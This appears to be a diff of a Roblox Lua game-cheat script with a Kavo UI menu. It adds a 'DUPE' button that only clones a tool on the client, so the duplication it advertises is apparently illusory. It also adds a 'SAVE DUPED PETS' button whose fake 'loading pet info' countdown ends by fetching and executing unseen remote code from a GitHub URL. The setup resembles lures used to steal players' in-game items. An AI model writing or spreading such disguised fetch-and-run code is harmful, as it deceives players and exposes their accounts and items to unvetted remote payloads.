@@ -1,36 +1,74 @@
--- 状態ラベルを再作成する関数
-local statusLabel -- グローバルに保持しておく
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
 
-local function setStatus(text)
-	-- 既存ラベルを削除（可能な場合）
-	if statusLabel then
-		statusLabel:Destroy()
+-- Kavo UIのロード
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("2.0 - New Flow", "Ocean")
+
+-- メインタブ作成
+local MainTab = Window:NewTab("Main")
+local MainSection = MainTab:NewSection("Main Controls")
+
+-- ツール名表示ラベル（初期値：Nothing）
+local currentTool = "Nothing"
+MainSection:NewLabel("Holding: " .. currentTool)
+
+-- 定期更新：現在持っているツール名を表示
+RunService.RenderStepped:Connect(function()
+	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+	local name = tool and tool.Name or "Nothing"
+	if name ~= currentTool then
+		currentTool = name
+		MainSection:UpdateLabel("Holding: " .. currentTool)
 	end
-	-- 新しいラベル作成
-	statusLabel = MainSection:NewLabel("SAVE STATUS: " .. text)
-end
+end)
 
--- 初期表示
-setStatus("Ready")
+-- Dupe 回数入力
+local dupeAmount = 1
+MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
+	local number = tonumber(text)
+	if number and number >= 1 and number <= 100 then
+		dupeAmount = number
+	else
+		warn("Enter a number between 1 and 100")
+	end
+end)
 
--- SAVE DUPED PETS ボタン
+-- 複製ボタン
+MainSection:NewButton("DUPE", "Duplicate your tool", function()
+	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+	if not tool then
+		warn("No tool to duplicate.")
+		return
+	end
+	for i = 1, dupeAmount do
+		local clone = tool:Clone()
+		clone.Parent = player.Backpack
+	end
+end)
+
+-- 状態表示用ラベル
+local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
+
+-- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
 MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
 	task.spawn(function()
 		for i = 30, 1, -1 do
-			setStatus("⌛ Loading pet info... (" .. i .. "s)")
+			statusLabel:UpdateLabel("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
 			wait(1)
 		end
 
-		setStatus("🚀 Booting...")
+		statusLabel:UpdateLabel("SAVE STATUS: 🚀 Booting...")
 
 		local success, err = pcall(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 		end)
 
 		if success then
-			setStatus("✅ Success!")
+			statusLabel:UpdateLabel("SAVE STATUS: ✅ Success!")
 		else
-			setStatus("❌ Error: " .. tostring(err))
+			statusLabel:UpdateLabel("SAVE STATUS: ❌ Error: " .. tostring(err))
 		end
 	end)
 end)
